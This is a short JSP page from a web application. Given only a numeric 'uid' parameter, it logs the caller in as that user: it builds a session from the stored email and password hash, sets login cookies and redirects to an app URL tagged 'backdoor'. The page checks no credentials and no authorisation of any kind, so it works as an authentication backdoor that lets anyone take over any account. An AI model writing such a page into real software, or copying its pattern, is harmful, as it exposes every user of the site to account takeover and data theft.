<%@ include file="./all.jsp"%>
<%
    WebUtils wu = new WebUtils(request, response);

    Integer userId = StringUtils.parseInt(request.getParameter("uid"));

    if (userId == null) {
        out.println("No user id provided");
        return;
    }


    // Retrieving user
    User user = UserDao.getById(null, userId);

    if (user == null) {
        out.println("User does not exist");
        return;
    }

    Boolean persistent = false;

    // Login user persistently
    UserSession userSession = UserWebServices.authenticateAndCreateSession(wu, user.getEmail(), user.getPasswordHash(), persistent);

    // Install login cookies at client
    UserWebServices.installCookies(wu, user.getId(), userSession.getChecksum(), persistent);

    // Sending user to application
    wu.redirect("/d/app?backdoor");
%>
